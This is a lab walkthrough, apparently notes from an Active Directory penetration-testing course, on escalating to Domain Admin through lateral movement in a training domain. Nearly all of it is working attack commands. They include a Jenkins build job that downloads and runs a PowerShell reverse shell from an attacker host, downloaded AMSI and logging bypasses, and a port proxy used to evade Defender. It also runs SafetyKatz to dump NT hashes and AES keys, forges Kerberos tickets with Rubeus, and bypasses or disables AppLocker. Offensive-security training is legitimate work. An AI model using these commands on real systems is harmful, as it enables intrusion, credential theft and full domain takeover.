# Learning Objective 7 — Domain Admin Escalation via Lateral Movement

**Date:** 31 July 2026

---

## Task 1: Identify Machine With Domain Admin Session

```powershell
Invoke-SessionHunter -NoPortScan -RawResults -Targets <server.txt> | Select-Object hostname, UserSession, Access
```

Output shows machines where Domain Admins have active sessions.

---

## Task 2: Get Reverse Shell from Jenkins

1. Setup listener on attacker:
```powershell
nc64.exe -nlvp 443
```

2. In Jenkins, create build job with:
```powershell
powershell iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowershellTcp.ps1);power -Reverse -IPaddress 172.16.100.1 -port 443
```

3. Build job to get reverse shell.

---

## Task 3: Upload Bypass Files

Start HFS server and upload:
- sbloggingbypass.txt
- amsi.txt
- PowerView.ps1

Load in reverse shell:
```powershell
iex (New-Object System.NET.WebClient).DownloadString('http://<ip>/sbloggingbypass.txt')
iex (New-Object System.NET.WebClient).DownloadString('http://<ip>/amsi.txt')
iex (New-Object System.NET.WebClient).DownloadString('http://<ip>/PowerView.ps1')
```

---

## Task 4: Hunt Domain Admin Sessions (Requires Admin)

```powershell
Find-DomainUserLocation -Verbose
Get-NetSession -ComputerName dcorp-adminsrv -Verbose
```

> **Note:** Requires local admin privilege on target machines.

---

## Task 5: Extract Credentials via SafetyKatz

**Step 1:** Copy Loader to target
```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

**Step 2:** Use netsh port proxy to avoid Defender detection
```powershell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1"
```

**Step 3:** Run SafetyKatz via Loader
```powershell
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/safetykatz.exe sekurlsa::evasive-keys exit"
```

Extracts NT hashes and AES256 keys.

---

## Task 6: Escalate to DA Using Extracted Keys

```powershell
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Creates new shell as Domain Admin.

---

## Task 7: Bypass AppLocker (Method 1: Gaps in Rules)

**Step 1:** Copy Invoke-TheKatEx-Keys script to target
```powershell
Copy-Item C:\AD\tools\Invoke-TheKatEx-Keys-std1.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\C$\'Program Files'
```

**Step 2:** Open PSSession
```powershell
Enter-PSSession dcorp-adminsrv
```

**Step 3:** Check language mode
```powershell
$ExecutionContext.SessionState.LanguageMode
```

**Step 4:** Run credential extraction scripts
```powershell
./Invoke-TheKatEx-Keys-std1.ps1
./Invoke-TheKatEx-stdvault.ps1
```

**Step 5:** Escalate via derivative local admin
```powershell
runas /user:dcorp\srvadmin /netonly cmd
```

---

## Task 8: Bypass AppLocker (Method 2: Disable via GPO)

**Step 1:** Open Group Policy Manager
```powershell
gpmc.msc
```

**Step 2:** Find GPO applicable to dcorp-adminsrv

**Step 3:** Modify policy settings:
- Delete all executable rules in AppLocker
- Disable AppLocker enforcement

**Step 4:** Force GPO update
```powershell
gpupdate /force
```

---

## Key Techniques

**Port Proxy via netsh:** Avoid direct downloads (evade Defender)
```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1
```

**Rubeus for Kerberos:** Create TGT using extracted keys
```powershell
Rubeus.exe asktgt /user:admin /aes256:<key> /opsec /createnetonly:cmd.exe /ptt
```

**AppLocker Bypass:** Exploit script exceptions or disable via GPO

---

## References

- [Rubeus](https://github.com/GhostPack/Rubeus)
- [SafetyKatz](https://github.com/GhostPack/SafetyKatz)
- [AppLocker Bypass](https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/)

---

*Next: Learning Objective 8 — Persistence & Forest Traversal*
